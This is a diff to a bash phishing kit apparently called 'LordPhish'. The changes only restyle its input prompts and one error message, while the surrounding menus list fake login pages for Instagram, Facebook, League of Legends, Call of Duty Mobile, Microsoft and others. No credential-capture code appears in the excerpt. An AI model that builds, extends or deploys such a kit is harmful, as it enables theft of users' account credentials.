@@ -170,7 +170,7 @@ printf "${lightGreen}[${boldLightGray}16${lightGreen}]${reset}${cyan} Microsoft$
 printf "${lightGreen}[${boldLightGray}17${lightGreen}]${reset}${cyan} Youtube${reset}        ${lightGreen}[${boldLightGray}34${lightGreen}]${reset}${cyan} StackOverflow${reset}    ${lightGreen}[${boldLightGray}51${lightGreen}]${reset}${cyan} operadoras${reset} \n"
 printf "${lightGreen}[${boldLightGray}99${lightGreen}]${reset}${red} Custom ${reset}        ${lightGreen}[${boldLightGray}Y${lightGreen}]${reset}${red} Youtube channel ${reset}  ${lightGreen}[${boldLightGray}T${lightGreen}]${reset}${red} Telegram Group${reset} \n"     
 printf "${lightGreen}[${boldLightGray}00${lightGreen}]${reset}${red} Exit${reset}           ${lightGreen}[${boldLightGray}F${lightGreen}]${reset}${red} Follow me one Github${reset}\n"
-read -p $' ${red}[${boldLightGray}~${red}]${reset}${lightGreen} Select an option: ${reset}${cyan}' menu_option
+read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' menu_option
 
 case $menu_option in
     1|01)
@@ -447,7 +447,7 @@ printf " ${boldRed}[${reset}${boldLightGray}04${reset}${boldRed}]${reset}${boldY
 printf " ${boldRed}[${reset}${boldLightGray}05${reset}${boldRed}]${reset}${boldYellow} Clash Of Clans${reset}\n"
 
 printf "\n"
-read -p $' ${boldRed}[${reset}${boldLightGray}~${reset}${boldRed}]${reset}${boldYellow} Select an option: ${reset}' game
+read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' game
 
 if [[ $game == 1 || $game == 01 ]]; then
 server="codm"
@@ -486,7 +486,7 @@ printf "${boldRed}[${reset}${boldLightGray}02${reset}${boldRed}]${reset}${boldYe
 printf "${boldRed}[${reset}${boldLightGray}03${reset}${boldRed}]${reset}${boldYellow} LOL New Login Page${reset}\n"
 printf "${boldRed}[${reset}${boldLightGray}04${reset}${boldRed}]${reset}${boldYellow} LOL Old login Page${reset}\n"
 printf "${reset}\n"
-read -p $' ${boldRed}[${reset}${boldLightGray}~${reset}${boldRed}]${reset}${boldGreen} Select an option: ${reset}${boldCyan}\n' lol_option
+read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' lol_option
 
 if [[ $lol_option == 1 || $lol_option == 01 ]]; then
 server="lol"
@@ -544,7 +544,7 @@ printf "${boldRed}[${reset}${boldLightGray}04${reset}${boldRed}]${reset}${boldYe
 printf "${boldRed}[${reset}${boldLightGray}05${reset}${boldRed}]${reset}${boldYellow} IG Autoliker Page${reset}\n"
 printf "${boldRed}[${reset}${boldLightGray}06${reset}${boldRed}]${reset}${boldYellow} IG Followers Page${reset}\n"
 printf "${reset}\n"
-read -p $' ${boldRed}[${reset}${boldLightGray}~${reset}${boldRed}]${reset}${boldGreen} Select an option: ${reset}${boldCyan}\n' insta_option
+read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en'  insta_option
 
 if [[ $insta_option == 1 || $insta_option == 01 ]]; then
 server="instagram"
@@ -593,7 +593,7 @@ printf "${boldRed}[${reset}${boldLightGray}08${reset}${boldRed}]${reset}${boldYe
 printf "${boldRed}[${reset}${boldLightGray}09${reset}${boldRed}]${reset}${boldYellow} Fake Mia Khalifa Page${reset}\n"
 printf "${boldRed}[${reset}${boldLightGray}10${reset}${boldRed}]${reset}${boldYellow} Fake PUBG-lite Page${reset}\n"
 printf "${reset}\n"
-read -p $' ${boldRed}[${reset}${boldLightGray}~${reset}${boldRed}]${reset}${boldGreen} Select an option: ${reset}${boldCyan}\n' fb_option
+read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en'  fb_option
 
 if [[ $fb_option == 1 || $fb_option == 01 ]]; then
 server="facebook"
@@ -723,7 +723,7 @@ if [[ $op_menu == 1 ]]; then
         server"Microsoft"
         start1
         else
-            printf "\e[1;93m [!] Invalid option!\e[0m\n"
+            printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
             menu
             fi
 }
